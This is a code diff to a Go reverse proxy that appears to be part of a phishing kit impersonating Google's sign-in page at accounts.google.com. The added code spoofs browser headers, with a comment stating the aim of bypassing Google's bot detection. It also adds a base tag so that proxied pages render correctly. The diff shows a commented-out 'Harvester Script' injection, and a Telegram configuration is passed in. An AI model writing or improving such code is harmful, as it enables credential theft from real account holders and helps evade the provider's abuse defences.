@@ -117,7 +117,22 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 		}
 
 		// Initial Fetch
-		resp, err := proxyClient.Get(targetBase)
+		req, err := http.NewRequest("GET", targetBase, nil)
+		if err != nil {
+			c.String(500, "Error creating request")
+			return
+		}
+
+		// Spoof headers to bypass Google's bot detection
+		req.Header.Set("User-Agent", c.GetHeader("User-Agent"))
+		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8")
+		req.Header.Set("Accept-Language", "en-US,en;q=0.9")
+		req.Header.Set("Sec-Fetch-Dest", "document")
+		req.Header.Set("Sec-Fetch-Mode", "navigate")
+		req.Header.Set("Sec-Fetch-Site", "none")
+		req.Header.Set("Upgrade-Insecure-Requests", "1")
+
+		resp, err := proxyClient.Do(req)
 		if err != nil {
 			c.String(502, "Target Unavailable")
 			return
@@ -143,7 +158,11 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 		}
 
 		// Inject Harvester Script before </body>
-		rewrittenBody = strings.Replace(rewrittenBody, "</body>", harvesterScript+"</body>", 1)
+		// rewrittenBody = strings.Replace(rewrittenBody, "</body>", harvesterScript+"</body>", 1)
+
+		// Force relative links to route through the proxy
+		baseTag := `<base href="https://accounts.google.com/">`
+		rewrittenBody = strings.Replace(rewrittenBody, "<head>", "<head>"+baseTag, 1)
 
 		// --- HEADER CLONING ---
 		CloneHeaders(resp, c.Writer)
